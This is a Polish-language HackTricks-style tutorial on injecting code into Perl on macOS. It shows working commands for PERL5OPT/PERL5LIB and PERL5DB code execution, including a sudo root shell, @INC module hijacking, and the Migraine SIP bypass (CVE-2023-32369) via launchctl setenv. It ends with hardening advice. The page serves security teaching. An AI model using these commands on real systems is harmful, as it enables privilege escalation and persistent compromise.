# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Poprzez zmienną środowiskową `PERL5OPT` & `PERL5LIB`

Używając zmiennej środowiskowej **`PERL5OPT`**, możliwe jest zmuszenie **Perl** do wykonywania dowolnych poleceń, gdy interpreter się uruchamia (nawet **przed** zanalizowaniem pierwszej linii docelowego skryptu). Na przykład, stwórz ten skrypt:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Teraz **wyeksportuj zmienną środowiskową** i uruchom skrypt **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Inną opcją jest stworzenie modułu Perl (np. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
A następnie użyj zmiennych środowiskowych, aby moduł był lokalizowany i ładowany automatycznie:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Inne interesujące zmienne środowiskowe

* **`PERL5DB`** – gdy interpreter jest uruchamiany z flagą **`-d`** (debugger), zawartość `PERL5DB` jest wykonywana jako kod Perl *w kontekście* debuggera. 
Jeśli możesz wpływać zarówno na środowisko **jak i** flagi wiersza poleceń uprzywilejowanego procesu Perl, możesz zrobić coś takiego:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # uruchomi powłokę przed wykonaniem skryptu
```

* **`PERL5SHELL`** – w systemie Windows ta zmienna kontroluje, który plik wykonywalny powłoki Perl użyje, gdy będzie musiał uruchomić powłokę. Wspomniano o niej tutaj tylko dla pełności, ponieważ nie jest istotna w macOS.

Chociaż `PERL5DB` wymaga przełącznika `-d`, powszechnie można znaleźć skrypty konserwacyjne lub instalacyjne, które są wykonywane jako *root* z włączoną tą flagą dla szczegółowego rozwiązywania problemów, co czyni tę zmienną ważnym wektorem eskalacji.

## Poprzez zależności (nadużycie @INC)

Możliwe jest wylistowanie ścieżki dołączania, którą Perl będzie przeszukiwał (**`@INC`**), uruchamiając:
```bash
perl -e 'print join("\n", @INC)'
```
Typowy wynik na macOS 13/14 wygląda następująco:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Niektóre z zwróconych folderów nawet nie istnieją, jednak **`/Library/Perl/5.30`** istnieje, *nie* jest chroniony przez SIP i znajduje się *przed* folderami chronionymi przez SIP. Dlatego, jeśli możesz pisać jako *root*, możesz umieścić złośliwy moduł (np. `File/Basename.pm`), który będzie *preferencyjnie* ładowany przez każdy skrypt z uprawnieniami importujący ten moduł.

> [!WARNING]
> Nadal potrzebujesz **root** do pisania w `/Library/Perl`, a macOS wyświetli monit **TCC** prosząc o *Pełny dostęp do dysku* dla procesu wykonującego operację zapisu.

Na przykład, jeśli skrypt importuje **`use File::Basename;`**, możliwe byłoby stworzenie `/Library/Perl/5.30/File/Basename.pm` zawierającego kod kontrolowany przez atakującego.

## Ominięcie SIP za pomocą Asystenta Migracji (CVE-2023-32369 “Migrena”)

W maju 2023 roku Microsoft ujawnił **CVE-2023-32369**, nazywany **Migreną**, technikę post-exploitation, która pozwala atakującemu *root* na całkowite **ominięcie Ochrony Integralności Systemu (SIP)**. 
Wrażliwym komponentem jest **`systemmigrationd`**, demon z uprawnieniami **`com.apple.rootless.install.heritable`**. Każdy proces potomny uruchomiony przez ten demon dziedziczy uprawnienia i dlatego działa **poza** ograniczeniami SIP.

Wśród dzieci zidentyfikowanych przez badaczy znajduje się interpreter podpisany przez Apple:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Ponieważ Perl respektuje `PERL5OPT` (a Bash respektuje `BASH_ENV`), zanieczyszczenie *środowiska* demona jest wystarczające, aby uzyskać dowolne wykonanie w kontekście bez SIP:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Kiedy `migrateLocalKDC` jest uruchamiane, `/usr/bin/perl` startuje z złośliwym `PERL5OPT` i wykonuje `/private/tmp/migraine.sh` *zanim SIP zostanie ponownie włączony*. Z tego skryptu można na przykład skopiować ładunek do **`/System/Library/LaunchDaemons`** lub przypisać rozszerzony atrybut `com.apple.rootless`, aby uczynić plik **nieusuwalnym**.

Apple naprawiło problem w macOS **Ventura 13.4**, **Monterey 12.6.6** i **Big Sur 11.7.7**, ale starsze lub niezałatane systemy pozostają podatne na ataki.

## Rekomendacje dotyczące zabezpieczeń

1. **Wyczyść niebezpieczne zmienne** – uprzywilejowane launchdaemons lub zadania cron powinny startować w czystym środowisku (`launchctl unsetenv PERL5OPT`, `env -i`, itd.).
2. **Unikaj uruchamiania interpreterów jako root** chyba że jest to ściśle konieczne. Używaj skompilowanych binariów lub szybko zrzucaj uprawnienia.
3. **Dostarczaj skrypty z `-T` (tryb zanieczyszczenia)**, aby Perl ignorował `PERL5OPT` i inne niebezpieczne przełączniki, gdy sprawdzanie zanieczyszczenia jest włączone.
4. **Utrzymuj macOS w aktualności** – “Migraine” jest w pełni załatane w bieżących wydaniach.

## Odnośniki

- Microsoft Security Blog – “Nowa podatność macOS, Migraine, może obejść Ochronę Integralności Systemu” (CVE-2023-32369), 30 maja 2023.
- Hackyboiz – “Badanie obejścia SIP w macOS (PERL5OPT & BASH_ENV)”, maj 2025.

{{#include ../../../banners/hacktricks-training.md}}
